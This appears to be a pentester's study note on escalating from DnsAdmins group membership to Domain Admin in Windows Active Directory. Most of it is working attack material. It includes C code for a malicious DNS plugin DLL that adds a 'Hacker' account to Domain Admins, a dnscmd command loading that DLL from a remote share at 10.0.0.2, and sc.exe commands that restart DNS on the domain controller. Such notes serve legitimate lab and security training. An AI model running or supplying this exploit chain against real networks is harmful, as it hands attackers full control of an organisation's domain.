For the attack to work, we need to have compromised a user that belongs to a `DnsAdmins` group on a domain. Luckily, our user `spotless` already belongs to the said group:
```
 net user spotless /domain
```
![[image 16.png]]

Build the DLL
https://github.com/dim0x69/dns-exe-persistance/tree/master

Edit Win32Project1.cpp
![[Pasted image 20240917121727.png]]
Add your exploit
```
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

Use dnscmd to load dll
```
dnscmd dc01 /config /serverlevelplugindll \\10.0.0.2\tools\dns-priv\dnsprivesc.dll
```
```
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
